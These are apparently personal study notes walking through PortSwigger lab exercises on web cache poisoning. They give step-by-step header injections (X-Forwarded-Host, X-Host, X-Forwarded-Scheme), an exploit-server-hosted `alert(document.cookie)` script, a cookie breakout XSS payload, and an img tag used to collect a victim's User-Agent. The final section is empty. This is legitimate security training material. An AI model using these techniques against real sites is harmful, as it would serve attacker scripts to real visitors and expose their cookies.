# Web Cache Poisoning Notes

[Portswigger](https://portswigger.net/web-security/web-cache-poisoning)

## Methodology

- use a cache buster parameter to avoid poisoning arbitrary users: `?cache=1234`
- send request of main page until you see a `X-Cache: hit` or `X-Cache: miss` - this means caching is happening

## Labs walkthrough

### Web cache poisoning with an unkeyed header

Background: 

```This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. ```

- go to the sites home page
- study the requests and responses that you generated, find the `GET` request for the home page and send it to repeater
- add a cache buster query parameter such as `?cb=1234`
- add the `X-Forwarded-Host` header with an arbitrary hostname such as `example.com` and send the request
- observe the `X-Forwarded-Host` header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at `/resources/js/tracking.js`
- replay the request and observe that the response contains the `X-Cache: hit`, this tells us that the response came from the cache
- go to the exploit server and change the file name to match the path used by the vulnerable path `/resource/js/tracking.js`
- in the body enter the payload `alert(document.cookie)` and store it
- in repeater remove the cache buster and add the exploit server to the `X-Forwarded-Host` header
- send the malicious request, keep replaying the request until you see your exploit server URL being reflected in the response and `X-Cache: hit` in the headers
- to simulate the victim, load the poisoned URL in the browser and make sure that the `alert()` is triggered, note that you have to perform this test before the cache expires which is every 30 seconds

### Web cache poisoning with an unkeyed cookie

Background: 
```This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.```

- go to the sites home page
- Notice that the first response you received sets the cookie `fehost=prod-cache-01`
- Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response
- send this to repeater and add a cache buster as a query parameter
- change the cookie to some arbitrary value and resend and observe it being reflected in the reponse
- now put a payload in the cookie like so: `fehost=someString"-alert(1)-"someString`
- Replay the request until you see the payload in the response and X-Cache: hit in the headers
- Load the URL in the browser and confirm the alert() fires
- now go back to repeater and remove the cache buster and redeliver

### Web cache poisoning with multiple headers

Background:

```This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.```

- go to the sites home page
- in burps history find the GET request for the JavaScript file `/resources/js/tracking.js` and send to repeater
- add a cache-buster query parameter and the `X-Forwarded-Host` header with a random value, we come to the conclusion it doesn't do anything
- remove the `X-Forwarded-Host` header and add the `X-Forwarded-Scheme` header instead, notice that any value other than `HTTPS` gets a `302` response, notice in the `Location` header we are being redirected to the same URL that we requested but using `https://`
- add the `X-Forwarded-Host: example.com` header back to the request but keep the `X-Forwarded-Scheme: nothttps` as well, this time we notice that the `Location` header of the `302` redirect now points to `https://example.com/`
- go to the exploit server and change the file name to match the path used by the vulnerable response: `/resources/js/tracking.js`
- in the body enter the payload `alert(document.cookie)` and store it
- go back to the request in repeater and set the `X-Forwarded-Host` header with the exploit servers URL as the value
- set the `X-Forwarded-Scheme` header to anything but `HTTPS` so you get the redirect
- send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers
- to validate that this worked, right click the request in repeater and do the `Copy URL` and open in the browser, if the alert exists in here than it worked (the alert won't actually fire here)
- go back to repeater, remove the cache buster and resend the request until you poison the cache again
- reload the home page until your alert triggers, then poison again until the user visits

### Targeted web cache poisoning using an unknown header

Background: 

```A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs. ```

- go to the sites home page
- in burps history find the `GET` of the homepage and right-click it and in extensions use `Param Miner` with the `Guess headers` option, param miner will report back about a secret input in the form of `X-Host` header
- send this request to repeater and add a cache-buster query parameter
- add the `X-Host` header with an arbitrary hostname such as `example.com`, observe that the value of this header is used to dunamically generate a URL for importing the JavaScript file stored at `/resources/js/tracking.js`
- go to the exploit server and change the file name to match the path used by the vulnerable response `/resources/js/tracking.js`
-  In the body, enter the payload `alert(document.cookie)` and store it
-  add exploit server to the `X-Host` header and send it until you see the exploit server in the response and the `X-Cache: hit` header
-  load the URL in the browser and validate the alert triggers
-  notice that the `Vary` header is used to specify that the `User-Agent` is part of the cache key, we need to find the victims `User-Agent` to target them
-  in the website a comment functionality accepts HTML tags, post a comment with the exploit server to grab the users `User-Agent` with somehting like:  `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
-  open access log on exploit server and check until you get the users `User-Agent`
-  place the victims `User-Agent` into your repeater request, remove your cache buster and send it again until you poison with the exploit server URL in the response and it having the `X-Cache: hit` header as well

### Web cache poisoning via an unkeyed query string

Background: 

```

```











